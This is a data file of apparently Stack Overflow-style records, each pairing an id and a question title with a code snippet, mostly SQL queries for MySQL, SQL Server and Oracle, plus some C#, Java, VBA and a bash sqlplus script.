   USING (VALUES(1,'BeepBeep','PeepPeep')) AS TheNewThing(A,B,C)
     ON #Stuff.Beep = TheNewThing.A
WHEN MATCHED THEN UPDATE SET #Stuff.Boop = TheNewThing.B, #Stuff.Baap = 'fixed'
WHEN NOT MATCHED THEN INSERT (Beep,Boop,Baap) VALUES (
  TheNewThing.A, TheNewThing.B, TheNewThing.C);

SELECT * FROM #STUFF
"
37524,46807,Separating XML values with the same tags into different rows SQL Server,"DECLARE @allUsers XML=
'<?xml version=""1.0""?>
<?mso-application progid=""Excel.Sheet""?>
<Workbook xmlns=""urn:schemas-microsoft-com:office:spreadsheet""
 xmlns:o=""urn:schemas-microsoft-com:office:office""
 xmlns:x=""urn:schemas-microsoft-com:office:excel""
 xmlns:ss=""urn:schemas-microsoft-com:office:spreadsheet""
 xmlns:html=""http://www.w3.org/TR/REC-html40"">
 <Worksheet>
 <Table>
   <Row ss:AutoFitHeight=""0"" ss:Height=""30"">
    <Cell ss:StyleID=""s22""/>
    <Cell ss:StyleID=""s24""><Data ss:Type=""String"">Jane Doe</Data></Cell>
    <Cell ss:StyleID=""s24""><Data ss:Type=""String"">JaneDoe</Data></Cell>
    <Cell ss:StyleID=""s24""><Data ss:Type=""String"">XYZ</Data></Cell>
    <Cell ss:StyleID=""s24""><Data ss:Type=""String"">(555) 555-5555</Data></Cell>
    <Cell ss:StyleID=""s22""/>
   </Row>
   </Table>
 </Worksheet>   
</Workbook>';

;WITH XMLNAMESPACES ('urn:schemas-microsoft-com:office:spreadsheet' as ss
                     ,DEFAULT 'urn:schemas-microsoft-com:office:spreadsheet')
SELECT T.X.value('Cell[1]/Data[1]','varchar(max)') AS DontKnow1
      ,T.X.value('Cell[2]/Data[1]','varchar(max)') AS Name
      ,T.X.value('Cell[3]/Data[1]','varchar(max)') AS UserName
      ,T.X.value('Cell[4]/Data[1]','varchar(max)') AS DontKnow2
      ,T.X.value('Cell[5]/Data[1]','varchar(max)') AS Telephone
      ,T.X.value('Cell[6]/Data[1]','varchar(max)') AS DontKnow3
FROM @allUsers.nodes('/Workbook/Worksheet/Table/Row') as T(X)
"
14218,36871,Complex INNER JOIN SQL request,"SELECT DISTINCT users.uid
FROM users
JOIN opinion o, opinion o2
WHERE users.uid = o.authorid
AND users.uid = o2.authorid
AND o2.statementid = $sid2
AND o.statementid = $sid1
"
9265,6021,Counting the duplicate and setting the record in calculated column in SQL,"SELECT ID, StudentName, FatherName, NIC,No_of_Childrens,Date_of_Birth, Date_of_Admission
FROM
(
SELECT ID, StudentName, FatherName, NIC,Date_of_Birth, Date_of_Admission,No_of_Childrens = RANK() OVER(PARTITION BY NIC ORDER BY ID)
FROM Student_Information) A ORDER BY ID
"
28734,56103,select from database table rows that are not in another table,"SELECT *
FROM FirstTable T
WHERE NOT EXISTS (
    SELECT *
    FROM SecondTable T2 
    WHERE T.Id = T2.Id
    )
"
13385,69831,SQL returning custom values based on query results keeping performance in mind,"with lookup  as (
     select 1 as val, 'Apple' as str union all
     select 2 as val, 'Pear' as str union all
     select 3 union all select 4 union all select 5
)
select coalesce(l.val, 'other')
from t left outer join
     lookup l
     on t.col = l.val
"
31077,46003,Select Top Order By query returns unexpected result,"SELECT TOP 1 SPECIAL_CODE1 * FROM CUSTOMERS 
WHERE isnumeric(SPECIAL_CODE1)=1 
ORDER BY CAST (SPECIAL_CODE1 AS INTEGER) DESC
"
26312,42929,mysql with 3 group by and sum,"SELECT currency_id,
       SUM(CASE
             WHEN TYPE = 'cash_in' THEN amount
           END) AS cash_in,
       SUM(CASE
             WHEN TYPE = 'cash_out' THEN amount
           END) AS cash_out,
       SUM(CASE
             WHEN TYPE = 'cash_in' THEN amount
             ELSE -amount
           END) AS balance
FROM   tb_cash_transaction
WHERE TYPE IN ('cash_in', 'cash_out') /*<--- Where clause probably not needed
                                       but just in case there are other options*/
GROUP  BY currency_id  
"
31909,66481,Counting the number of days excluding sunday between two dates,"SQL> WITH DATA AS
  2    (SELECT to_date('01/01/2014', 'DD/MM/YYYY') date1,
  3      to_date('31/12/2014', 'DD/MM/YYYY') date2
  4    FROM dual
  5    )
  6  SELECT SUM(holiday) holiday_count
  7  FROM
  8    (SELECT
  9      CASE
 10        WHEN TO_CHAR(date1+LEVEL-1, 'DY','NLS_DATE_LANGUAGE=AMERICAN') <> 'SUN'
 11        THEN 1
 12        ELSE 0
 13      END holiday
 14    FROM data
 15      CONNECT BY LEVEL <= date2-date1+1
 16    )
 17  /

HOLIDAY_COUNT
-------------
          313

SQL>
"
30851,71914,Usage of IN Clause in a Database query,"select
  *
from
  khatapayment_track t
    inner join khata_header h on (h.property_id = t.property_id)
where
  h.div_id = 2
"
26658,66061,"SQL - How to take data from one table, and insert it into another","INSERT INTO `messages` (`from`, `to`, `subject`, `body)
  SELECT 
   /* single-quote string literals to use them in the INSERT INTO...SELECT */
   'Predefined string From',
   /* Intermixed with column values from the rows returned by the SELECT */
   `username`,
   'Predefined string subject',
   'Predefined string body'
  FROM `users`
  WHERE `rank`='Super'
"
4078,53827,multi parameter in ActiveAndroid,"List<Chats> s = new Select()
            .from(Chats.class)
            .where(col_conversation + "" = ?"",conversation.getId())
            .where(col_sender + "" = ?"", sender.getId())
            .where(body + "" = ?"", body)
            .execute();
"
11401,19667,System.Data.DbType to TSQL parameter datatype," namespace CodeInsiders.SharpQL
    {
        using System;
        using System.Collections.Generic;
        using System.Data;

        public static class SqlMapper
        {
            private static readonly Dictionary<DbType, Type> DbTypeMapToNullableType = new Dictionary<DbType, Type>
                                                                                       {
                                                                                           { DbType.Byte, typeof(byte?) },
                                                                                           { DbType.SByte, typeof(sbyte?) },
                                                                                           { DbType.Int16, typeof(short?) },
                                                                                           { DbType.UInt16, typeof(ushort?) },
                                                                                           { DbType.Int32, typeof(int?) },
                                                                                           { DbType.UInt32, typeof(uint?) },
                                                                                           { DbType.Int64, typeof(long?) },
                                                                                           { DbType.UInt64, typeof(ulong?) },
                                                                                           { DbType.Single, typeof(float?) },
                                                                                           { DbType.Double, typeof(double?) },
                                                                                           { DbType.Decimal, typeof(decimal?) },
                                                                                           { DbType.Boolean, typeof(bool?) },
                                                                                           { DbType.StringFixedLength, typeof(char?) },
                                                                                           { DbType.Guid, typeof(Guid?) },
                                                                                           { DbType.DateTime, typeof(DateTime?) },
                                                                                           { DbType.DateTimeOffset, typeof(DateTimeOffset?) },
                                                                                           { DbType.Binary, typeof(byte[]) }
                                                                                       };

            private static readonly Dictionary<DbType, Type> DbTypeMapToType = new Dictionary<DbType, Type>
                                                                               {
                                                                                   { DbType.Byte, typeof(byte) },
                                                                                   { DbType.SByte, typeof(sbyte) },
                                                                                   { DbType.Int16, typeof(short) },
                                                                                   { DbType.UInt16, typeof(ushort) },
                                                                                   { DbType.Int32, typeof(int) },
                                                                                   { DbType.UInt32, typeof(uint) },
                                                                                   { DbType.Int64, typeof(long) },
                                                                                   { DbType.UInt64, typeof(ulong) },
                                                                                   { DbType.Single, typeof(float) },
                                                                                   { DbType.Double, typeof(double) },
                                                                                   { DbType.Decimal, typeof(decimal) },
                                                                                   { DbType.Boolean, typeof(bool) },
                                                                                   { DbType.String, typeof(string) },
                                                                                   { DbType.StringFixedLength, typeof(char) },
                                                                                   { DbType.Guid, typeof(Guid) },
                                                                                   { DbType.DateTime, typeof(DateTime) },
                                                                                   { DbType.DateTimeOffset, typeof(DateTimeOffset) },
                                                                                   { DbType.Binary, typeof(byte[]) }
                                                                               };

            private static readonly Dictionary<SqlDbType, Type> SqlDbTypeToNullableType = new Dictionary<SqlDbType, Type>
                                                                                          {
                                                                                              { SqlDbType.BigInt, typeof(long?) },
                                                                                              { SqlDbType.Binary, typeof(byte[]) },
                                                                                              { SqlDbType.Image, typeof(byte[]) },
                                                                                              { SqlDbType.Timestamp, typeof(byte[]) },
                                                                                              { SqlDbType.VarBinary, typeof(byte[]) },
                                                                                              { SqlDbType.Bit, typeof(bool?) },
                                                                                              { SqlDbType.Char, typeof(string) },
                                                                                              { SqlDbType.NChar, typeof(string) },
                                                                                              { SqlDbType.NText, typeof(string) },
                                                                                              { SqlDbType.NVarChar, typeof(string) },
                                                                                              { SqlDbType.Text, typeof(string) },
                                                                                              { SqlDbType.VarChar, typeof(string) },
                                                                                              { SqlDbType.Xml, typeof(string) },
                                                                                              { SqlDbType.DateTime, typeof(DateTime?) },
                                                                                              { SqlDbType.SmallDateTime, typeof(DateTime?) },
                                                                                              { SqlDbType.Date, typeof(DateTime?) },
                                                                                              { SqlDbType.Time, typeof(DateTime?) },
                                                                                              { SqlDbType.DateTime2, typeof(DateTime?) },
                                                                                              { SqlDbType.Decimal, typeof(decimal?) },
                                                                                              { SqlDbType.Money, typeof(decimal?) },
                                                                                              { SqlDbType.SmallMoney, typeof(decimal?) },
                                                                                              { SqlDbType.Float, typeof(double?) },
                                                                                              { SqlDbType.Int, typeof(int?) },
                                                                                              { SqlDbType.Real, typeof(float?) },
                                                                                              { SqlDbType.UniqueIdentifier, typeof(Guid?) },
                                                                                              { SqlDbType.SmallInt, typeof(short?) },
                                                                                              { SqlDbType.TinyInt, typeof(byte?) },
                                                                                              { SqlDbType.Variant, typeof(object) },
                                                                                              { SqlDbType.Udt, typeof(object) },
                                                                                              { SqlDbType.Structured, typeof(DataTable) },
                                                                                              { SqlDbType.DateTimeOffset, typeof(DateTimeOffset) }
                                                                                          };

            private static readonly Dictionary<SqlDbType, Type> SqlDbTypeToType = new Dictionary<SqlDbType, Type>
                                                                                  {
                                                                                      { SqlDbType.BigInt, typeof(long) },
                                                                                      { SqlDbType.Binary, typeof(byte[]) },
                                                                                      { SqlDbType.Image, typeof(byte[]) },
                                                                                      { SqlDbType.Timestamp, typeof(byte[]) },
                                                                                      { SqlDbType.VarBinary, typeof(byte[]) },
                                                                                      { SqlDbType.Bit, typeof(bool) },
                                                                                      { SqlDbType.Char, typeof(string) },
                                                                                      { SqlDbType.NChar, typeof(string) },
                                                                                      { SqlDbType.NText, typeof(string) },
                                                                                      { SqlDbType.NVarChar, typeof(string) },
                                                                                      { SqlDbType.Text, typeof(string) },
                                                                                      { SqlDbType.VarChar, typeof(string) },
                                                                                      { SqlDbType.Xml, typeof(string) },
                                                                                      { SqlDbType.DateTime, typeof(DateTime) },
                                                                                      { SqlDbType.SmallDateTime, typeof(DateTime) },
                                                                                      { SqlDbType.Date, typeof(DateTime) },
                                                                                      { SqlDbType.Time, typeof(DateTime) },
                                                                                      { SqlDbType.DateTime2, typeof(DateTime) },
                                                                                      { SqlDbType.Decimal, typeof(decimal) },
                                                                                      { SqlDbType.Money, typeof(decimal) },
                                                                                      { SqlDbType.SmallMoney, typeof(decimal) },
                                                                                      { SqlDbType.Float, typeof(double) },
                                                                                      { SqlDbType.Int, typeof(int) },
                                                                                      { SqlDbType.Real, typeof(float) },
                                                                                      { SqlDbType.UniqueIdentifier, typeof(Guid) },
                                                                                      { SqlDbType.SmallInt, typeof(short) },
                                                                                      { SqlDbType.TinyInt, typeof(byte) },
                                                                                      { SqlDbType.Variant, typeof(object) },
                                                                                      { SqlDbType.Udt, typeof(object) },
                                                                                      { SqlDbType.Structured, typeof(DataTable) },
                                                                                      { SqlDbType.DateTimeOffset, typeof(DateTimeOffset) }
                                                                                  };

            private static readonly Dictionary<Type, DbType> TypeToDbType = new Dictionary<Type, DbType>
                                                                            {
                                                                                { typeof(byte), DbType.Byte },
                                                                                { typeof(sbyte), DbType.SByte },
                                                                                { typeof(short), DbType.Int16 },
                                                                                { typeof(ushort), DbType.UInt16 },
                                                                                { typeof(int), DbType.Int32 },
                                                                                { typeof(uint), DbType.UInt32 },
                                                                                { typeof(long), DbType.Int64 },
                                                                                { typeof(ulong), DbType.UInt64 },
                                                                                { typeof(float), DbType.Single },
                                                                                { typeof(double), DbType.Double },
                                                                                { typeof(decimal), DbType.Decimal },
                                                                                { typeof(bool), DbType.Boolean },
                                                                                { typeof(string), DbType.String },
                                                                                { typeof(char), DbType.StringFixedLength },
                                                                                { typeof(Guid), DbType.Guid },
                                                                                { typeof(DateTime), DbType.DateTime },
                                                                                {
                                                                                    typeof(DateTimeOffset),
                                                                                    DbType.DateTimeOffset
                                                                                },
                                                                                { typeof(byte[]), DbType.Binary },
                                                                                { typeof(byte?), DbType.Byte },
                                                                                { typeof(sbyte?), DbType.SByte },
                                                                                { typeof(short?), DbType.Int16 },
                                                                                { typeof(ushort?), DbType.UInt16 },
                                                                                { typeof(int?), DbType.Int32 },
                                                                                { typeof(uint?), DbType.UInt32 },
                                                                                { typeof(long?), DbType.Int64 },
                                                                                { typeof(ulong?), DbType.UInt64 },
                                                                                { typeof(float?), DbType.Single },
                                                                                { typeof(double?), DbType.Double },
                                                                                { typeof(decimal?), DbType.Decimal },
                                                                                { typeof(bool?), DbType.Boolean },
                                                                                { typeof(char?), DbType.StringFixedLength },
                                                                                { typeof(Guid?), DbType.Guid },
                                                                                { typeof(DateTime?), DbType.DateTime },
                                                                                {
                                                                                    typeof(DateTimeOffset?),
                                                                                    DbType.DateTimeOffset
                                                                                },
                                                                            };

            public static Type ToClrType(this DbType dbType) {
                Type type;
                if (DbTypeMapToType.TryGetValue(dbType, out type)) {
                    return type;
                }

                throw new ArgumentOutOfRangeException(""dbType"", dbType, ""Cannot map the DbType to Type"");
            }

            public static Type ToClrType(this SqlDbType sqlDbType) {
                Type type;
                if (SqlDbTypeToType.TryGetValue(sqlDbType, out type)) {
                    return type;
                }

                throw new ArgumentOutOfRangeException(""sqlDbType"", sqlDbType, ""Cannot map the SqlDbType to Type"");
            }

            public static DbType ToDbType(this Type type) {
                DbType dbType;
                if (TypeToDbType.TryGetValue(type, out dbType)) {
                    return dbType;
                }

                throw new ArgumentOutOfRangeException(""type"", type, ""Cannot map the Type to DbType"");
            }

            public static Type ToNullableClrType(this DbType dbType) {
                Type type;
                if (DbTypeMapToNullableType.TryGetValue(dbType, out type)) {
                    return type;
                }

                throw new ArgumentOutOfRangeException(""dbType"", dbType, ""Cannot map the DbType to Nullable Type"");
            }

            public static Type ToNullableClrType(this SqlDbType sqlDbType) {
                Type type;
                if (SqlDbTypeToNullableType.TryGetValue(sqlDbType, out type)) {
                    return type;
                }

                throw new ArgumentOutOfRangeException(""sqlDbType"", sqlDbType, ""Cannot map the SqlDbType to Nullable Type"");
            }
        }
    }
"
14445,12522,Avoid rounding errors in SSRS for small values,"=Switch(Fields!val.Value = 0.0, ""---""
    , Fields!val.Value > 0.0, Format(Fields!val.Value, ""#,0.00"")
    , Fields!val.Value < 0.0, Format(Fields!val.Value, ""(#,0.00);(#,0.00)""))
"
1249,64921,"COUNT() with nulls, inside subquery","SELECT soundtrack.*, 
(SELECT WrappedQuery.rank 
FROM   (SELECT @rownum := @rownum + 1 AS rank, 
               prequery.soundtrack_id 
        FROM   (SELECT @rownum := 0) sqlvars, 
               (
               SELECT COALESCE(COUNT(vote.soundtrack_id),0) AS no_rows, 
                       soundtrack.id AS soundtrack_id 
                FROM   soundtrack
                LEFT JOIN  vote ON soundtrack.id=vote.soundtrack_id
                GROUP  BY soundtrack.id
                ORDER  BY 1 DESC
               ) prequery) WrappedQuery 
WHERE  WrappedQuery.soundtrack_id = soundtrack.id) AS rank 
FROM   soundtrack
ORDER  BY rank ASC;
"
17837,11664,Selecting most recent date between two columns,"SELECT ID,
       CASE WHEN Date1 > Date2 THEN Date1
            ELSE Date2
       END AS MostRecentDate
FROM Table
"
29327,45490,Deleting duplicates with a where clause,"delete t
    from table t join
         (select product, count(*) as cnt
          from table
          group by product
         ) tt
         on tt.product = t.product
    where tt.cnt > 1 and t.product_type = 'house';
"
20228,15397,How to use a sql table-valued parameter to filter results?,"create procedure [dbo].[usp_RecipientsSendCheck]
(
    @Type int,
    @RecipientsImports dbo.RecipientsImport READONLY
)
as
begin
    select i.Name
    from @RecipientsImports as i
        left outer join Recipients as r on r.Name = i.Name
        left outer join SendResults as s on s.RecipientId = r.id and s.[Type] = @Type
    where
        r.Name is null or
        s.id is not null
end
"
18510,44426,SQL 3 table join,"SELECT
  orders.order_id
FROM 
  orders
INNER JOIN
  orders_items
    ON orders.order_id = orders_items.order_id
INNER JOIN
  items
    ON orders_items.item_id = items.id
WHERE
  items.vendor = '3'
GROUP BY
  orders.order_id
"
13514,9316,MySQL: Get rows with different arguments,"SELECT name_id
FROM attributes
WHERE skill IN ('css', 'html')
GROUP BY name_id
HAVING COUNT(DISTINCT skill) = 2
"
17473,73938,Is there a way to SELECT and UPDATE rows at the same time?,"UPDATE TOP (10) HumanResources.Employee
SET VacationHours = VacationHours * 1.25,
    ModifiedDate = GETDATE() 
OUTPUT inserted.BusinessEntityID,
       deleted.VacationHours,
       inserted.VacationHours,
       inserted.ModifiedDate
INTO @MyTableVar;
"
9171,17529,using IN and comma in a CASE WHEN THEN ELSE,"and 
(
    @country ='NO' and n.stdnote_code in ('81','82','84','85','86','90','91')
    OR 
    @country<>'NO' and n.stdnote_code in ('86','87')
)
"
1458,29028,How to count two separate columns in the same table and sum them into a new column,"SELECT    playernames.id, name, 
          COUNT(CASE playernames.id WHEN winner THEN 1 ELSE NULL END) AS wins, 
          COUNT(match_id) AS matches
FROM      playernames 
LEFT JOIN matches ON playernames.id IN (winner, loser)
GROUP BY  playernames.id, name;
"
17291,46549,SQL Query with Optional Parameter and Possible Null Column,"select id, customername
from customertable
where (referredby = @referredby OR @referredby is null)
"
3909,55924,View takes longer than query,"select t.id, t.rev, t.contents
from (select t.id, t.rev, t.contents, MAX(rev) over (partition by id) as maxrev
      from MyTable t
     ) t
where t.rev = t.maxrev;
"
8953,2887,"Efficient Query, Table Bridge/Indexing and strucuture","select *
from 
schedule 
inner join semester 
on schedule.semester_id = semester.id
inner join office_hours
on office_hours.id = schedule.???
"
14730,31577,Dynamic Column Selection SQL,"select
    [date], fund_sk,Num_Bench, sum(weight * val)    
from 
(
    select * 
    from fact_returns   
    unpivot (val for type in (tr, net)) u 
) f
    inner join dim_benchmark b
        on f.bench = b.Bench
        and f.type = b.Type_Return
group by [date], fund_sk, Num_Bench
"
12354,2220,"How to write an SQL statement to use ""LIKE"" for nine different values?","  WHERE (FIELD2 LIKE '%value21' OR 
         FIELD2 LIKE '%value22' OR 
         FIELD2 LIKE '%value23' ...)
"
7442,34784,How to run two Oracle stored procedure one by one from Unix batch file,"#!/bin/bash

sqlplus -s my_scheme@database/pass<<END
execute first_procedure();
commit;

execute second_procedure(); 
commit;
exit;
END
"
36130,36680,Cross-referencing in postgreSQL?,"select address, name, max(price) as price, sum(quantity) as quantity
from products p 
join order_items oi 
on p.product_id = oi.product_id
join orders o
on o.order_id = oi.order_id
group by address, name order by address;
"
12887,45506,when is null show custom text other wise show id,"SELECT CASE
         WHEN prj.Proj_ID IS NULL
               OR prj.Proj_ID = '' THEN 'No Project'
         ELSE prj.Proj_ID + COALESCE(', ' + prj.[DESC], '')
       END AS 'Project Description'
FROM   prj
       LEFT OUTER JOIN other
         ON prj.Proj_ID = other.Proj_ID 
"
21634,49921,Increment the value of one column basing on another column,"update T
set bus_day_mtd = (
    select sum(bus_day) from T t2 where t2.ymd <= T.ymd
    --or cast(bus_day_flag as int) if referencing the bit column
)
"
15877,26070,MySQL DATE_FORMAT not outputting dates in correct order,"  SELECT * 
    FROM schedule 
   WHERE username='"".$_SESSION['username'].""' 
ORDER BY STR_TO_DATE(date, '%d/%m/%Y') ASC, start_time ASC
"
9493,67437,How to generate uniqueRowdate number for a datecolumn i?,"select concat(replace(cast(product as date), '-', ''),
              row_number() over(partition by product order by product)) as prod_id
  from tbl
"
2082,30895,Oracle 11g: Insert missing days into calendar table,"INSERT INTO calendar (client_id, entry_date) (
    SELECT holes.client_id, holes.hole
    FROM (
            SELECT cal.client_id, cal.mn + level AS hole
            FROM (
                    SELECT client_id, MIN(entry_date) AS mn, MAX(entry_date) AS mx
                    FROM calendar
                    GROUP BY client_id
                    HAVING MAX(entry_date)>MIN(entry_date)+1
                 ) cal
            CONNECT BY cal.mn + level < cal.mx
            GROUP BY cal.client_id, cal.mn + level
        ) holes LEFT OUTER JOIN calendar c ON holes.client_id = c.client_id AND c.entry_date = hole
    WHERE
        c.entry_date IS NULL
)
"
34309,65673,Mixing MATCH AGAINST with JOINO in MySQL,"SELECT authors.id, papers.id, MATCH (`mydb`.`authors`.name) AGAINST (%s) Score
FROM `mydb`.`auth2paper`
JOIN `mydb`.`papers` ON `mydb`.`auth2paper`.paper_id = `mydb`.`papers`.id
JOIN `mydb`.`authors` ON `mydb`.`auth2paper`.auth_id = `mydb`.`authors`.id
WHERE MATCH (`mydb`.`authors`.name) AGAINST (%s)
"
38402,62072,SQL Server add count column near existing select columns,"SELECT ID, 
       Company, 
       Total_Money, 
       no_items, 
       SUM(Total_Money) OVER(PARTITION BY Company) count_Total_Money_For_Company 
FROM   Company
"
28691,26180,How can I retrieve unique data from a table with father and son relationship on sql server,"select son, min(father) AS Father from itt1 group by son
"
32160,42746,classic asp stored procedures parameters,"objComm.Parameters.Append objComm.CreateParameter(""alphaChar"", adChar, adParamInput)
objComm.Parameters(""alphaChar"") = ""a""
objComm.Execute
"
29706,16709,How to retrieve the latest data on duplicates in this database?,"SELECT Customer.customer_id, Customer.Account_ID, Contact.Account_ID, Contact.Time_stamp
FROM Customer
INNER JOIN Contact ON Customer.Account_ID = Contact.Account_ID
WHERE Contact.Time_stamp = (SELECT MAX(C.Time_stamp) FROM Contact C WHERE C.Account_ID = Contact.Account_ID);
"
8264,15337,Find more than three columns having equal value in mysql,"SELECT DISTINCT id 
FROM   (SELECT id,col1 AS col from Yourtable
        UNION ALL 
        SELECT id,col2  from Yourtable
        UNION ALL 
        SELECT id,col3  from Yourtable
        UNION ALL 
        SELECT id,col4  from Yourtable
        Union ALL
        .......) A 
GROUP  BY id,col 
HAVING Count(1) > 3 
"
34890,15713,Grouping Mysql query contacts table by city,"SELECT  city, GROUP_CONCAT(name)
FROM    contacts
GROUP BY    city
"
7316,67090,MySQL aggregate report,"select DATE_FORMAT(created_on, '%m-%d-%Y') as date,
       substring_index(sku, '_', 1) as sku_prefix
       SUM(price) as total 
FROM order_items
WHERE created_on between FROM_UNIXTIME(1415577600) AND NOW()
GROUP BY date(v.created_on), substring_index(sku, '_', 1);
"
2452,6251,MySQL group by on two columns,"SELECT a.datetime, a.value, a.id FROM test a
WHERE NOT EXISTS
  (
     SELECT 1 FROM test b 
     WHERE b.id < a.id
       AND (a.datetime = b.datetime OR b.value = a.value)
  )
"
34058,26275,SQL - Convert one-to-many into one row,"  select [ID],
         [Name],
         max(case isnumeric([Other IDs]) when 1 then [Other IDs] end) UniqueID,
         max(case left([Other IDs],1) when 'r' then [Other IDs] end) StudentID
    from Table1
group by [ID],
         [Name]
order by [ID]
"
4850,24393,sql - get parentID with or without child in self refrenced table,"SELECT DISTINCT COALESCE(e2.eventID, e1.eventID), 
       COALESCE(e2.eventName, e1.eventName),
       COALESCE(e2.appFK, e1.appFK)
FROM events AS  e1
LEFT JOIN events AS e2 ON e1.parentID = e2.eventID AND e1.appFK = 1
WHERE (e1.appFK = 1 AND e1.parentID IS NULL) OR (e2.eventID IS NOT NULL)
"
27173,28907,How can i make better performance for my query?,"select 
    v.Id,  
    v.MissingVehicleFlag,  
    v.Make,  
    v.OatsModelId,  
    v.Model,  
    v.PersonalisedName,  
    v.RegistrationPlate, 
    v.ImageUrl,  
    v.ImageCropStartingX,  
    v.ImageCropStartingY, 
    v.LastModified, 
    v.Account_Id, 
    v.Deleted
from RobbinsuatLatest.dbo.Vehicles v  
    where NOT EXISTS (
        select v2.Id 
        from RobbinsuatLatest.dbo.VehiclesV2 v2
        WHERE v.Id = v2.Id
        )
"
26955,29357,select distinct values on XMLType,"with x1 as (select xmltype('<attributes>
  <attribute>
    <name>remoteAddress</name>
    <value>180.201.106.130</value>
  </attribute>
  <attribute>
    <name>domain</name>
    <value>BSI_US</value>
  </attribute>
</attributes>') x2 from dual)
select extract(value(x3),'/attribute/name') 
  from x1,
        table(xmlsequence(extract(x2,'/attributes/*')) ) x3
"
13314,39942,Oracle: Sorting by date and id,"order by to_date(date, 'dd/mm/yyyy'), id
"
11032,26676,sql: how can I find a value and replace it simultaneously?,"UPDATE outcome 
SET owner = NULL 
WHERE owner = '81'
"
15401,11119,How can I select a unique field sorted by a different field?,"SELECT DiscountID, MAX(DateCreated)
FROM PayServiceOperations
WHERE PayServiceTypeID = 2  
GROUP BY DiscountID;
"
27935,52037,SQL resulting table satisfies two conditions,"select name
from owner
where type in (select distinct type from owner where name = 'tim')
group by name
having count(distinct type) = (select count(distinct type) from owner where name = 'tim')
"
16422,56020,Querying multiple tables using aggregate functions,"SELECT e.sname, p.job, sum(t.hours)  
FROM employee e, time t, position p 
WHERE e.e_id = t.sid 
  AND t.position_id = p.position_id
GROUP BY e.sname, p.job 
"
13678,72092,How to Efficiently improve the following update query and why my query should not be used(oracle)?,"UPDATE EMP_COMPANY C1
SET SALARY = (SELECT 1.5 * AVG(C2.SALARY)
              FROM EMP_COMPANY C2
              WHERE C2.CNAME = C1.CNAME);
"
11049,60363,How to write SQL 'case' Command?,"SELECT userId, 
       MAX(CASE WHEN ApproverTypeID = 1 THEN ApproverTypeID END) AS Type1, 
       MAX(CASE WHEN ApproverTypeID = 2 THEN ApproverTypeID END) AS Type2
FROM table1
GROUP BY userId
"
36788,10154,Add value from array to xyseries,"public static XYMultipleSeriesDataset getDemoDataset(Cursor c,
            String title, String... columnName) {
        XYMultipleSeriesDataset dataset = new XYMultipleSeriesDataset();

        TimeSeries series = new TimeSeries(title);


        try {
            if (c.moveToFirst()) {
                do {
                    int mins = c.getInt(c.getColumnIndex(columnName[0]));


                    java.util.Date date =null;
                    try{
                        date = DateFactory.stringToDate(c.getString(c.getColumnIndex(columnName[1])));
                    }catch(Exception e){

                    }
                    if(date==null){
                        continue;
                    }
                    series.add(date, mins);
                } while (c.moveToNext());
            } else {
                Log.d(TAG, ""There were no values in the cursor."");
            }
        } finally {
            Log.d(TAG, ""finally from getDemoDataset being called"");
            c.close();
        }

        dataset.addSeries(series);

        return dataset;
    }
"
6073,68903,Using Count and date,"select *
from 
 (
   select House, Name, Job, hire_date,
      row_number() 
      over (partition by House
            order by Job desc, hire_date) as rn
   from tab
 ) as dt
where rn <= 3
"
33668,46015,Get Data Between Two Table Where There are no relation between Them,"select *
from supplier s
cross join Customer c
"
11892,28963,sp2-0310 error on 11g,"@D:\sqlscripts\abc.sql 
"
11278,35530,updating columns with a sequence number mysql,"SET @rank:=0;
update T
set Number=@rank:=@rank+1
"
8876,939,Stored Procedure combining resultsets,"CREATE DEFINER=`root`@`localhost` PROCEDURE `retrieveApplicantStatus`(IN in_userId INT)
BEGIN
    SELECT  u.in_userId,
            a.applicants_id, 
            a.approval,
            pf.result AS test_result, 
            pf.license_approval,
            tr.result AS trial_result
    FROM    (SELECT in_userId) AS u
            LEFT JOIN applicants AS a
                ON a.users_id = u.in_userId
            LEFT JOIN pass_fail AS pf
                ON pf.user_id = u.in_userId
            LEFT JOIN trial_result AS tr
                ON tr.user_id = u.in_userId;
END
"
10411,59010,why is ADODB inserting NULL values on update?,"dpath = ""a"" ''Trim(Range(""B2"").Text)
atime = ""a"" ''Trim(Range(""B3"").Text)
rtime = ""a"" ''Trim(Range(""B4"").Text)
lcalib = ""a"" ''Trim(Range(""B5"").Text)
aname = ""a"" ''Trim(Range(""B6"").Text)
rname = ""a"" ''Trim(Range(""B7"").Text)
bstate = ""a"" ''Trim(Range(""B8"").Text)

cn.Open strCon
cmd.ActiveConnection = cn
cmd.CommandText = _
    ""INSERT INTO `batchinfo` (`datapath`, `analysistime`,"" _
       & ""`reporttime`,`lastcalib`,`analystname`,`reportname`,"" _
       & ""`batchstate`,`instrument`) "" _
       & ""VALUES (?,?,?,?,?,?,?,?);""

cmd.Parameters.Append _
    cmd.CreateParameter(""datapath"", adChar, adParamInput, 100)
cmd.Parameters.Append _
     cmd.CreateParameter(""analysistime"", adChar, adParamInput, 100)
cmd.Parameters.Append _
     cmd.CreateParameter(""reporttime"", adChar, adParamInput, 100)
cmd.Parameters.Append _
     cmd.CreateParameter(""lastcalib"", adChar, adParamInput, 100)
cmd.Parameters.Append _
     cmd.CreateParameter(""analystname"", adChar, adParamInput, 100)
cmd.Parameters.Append _
     cmd.CreateParameter(""reportname"", adChar, adParamInput, 100)
cmd.Parameters.Append _
     cmd.CreateParameter(""batchstate"", adChar, adParamInput, 100)
cmd.Parameters.Append _
     cmd.CreateParameter(""instrument"", adChar, adParamInput, 100)

cmd.Parameters(""datapath"").Value = ""abc""
cmd.Parameters(""analysistime"").Value = atime
cmd.Parameters(""reporttime"").Value = rtime
cmd.Parameters(""lastcalib"").Value = lcalib
cmd.Parameters(""analystname"").Value = aname
cmd.Parameters(""reportname"").Value = rname
cmd.Parameters(""batchstate"").Value = ""bstate""
cmd.Parameters(""instrument"").Value = ""NA""

cmd.Execute
"
7129,53820,Case Statement Sql Multiple column check for dates,"Case 
    When 
        (stop_dt is null or stop_dt > @td) and
        (another_stop_date is null or another_stop_date > @td) 
    Then 'Y' 
    Else 'N' 
End
"
32235,19648,oracle SQL: get every 2nd value of a string,"select * from(
select regexp_substr('3:113:1:14:5:6:7:8','[^ :]+', 2, level), level lvl
        from dual
connect by regexp_substr('3:113:1:14:5:6:7:8','[^ :]+', 2, level) 
        is not null
) where mod(lvl,2)=1;  
"
16278,36393,SQL Server 2005 How Create a Unique Constraint?,"ALTER TABLE <tablename> ADD CONSTRAINT
            <constraintname> UNIQUE NONCLUSTERED
    (
                <columnname>
    )
"
16963,35098,Single Update query for ans,"UPDATE myTable
SET gender = CASE
             WHEN gender = 'F' THEN 'M'
             WHEN gender = 'M' THEN 'F'
         END
"
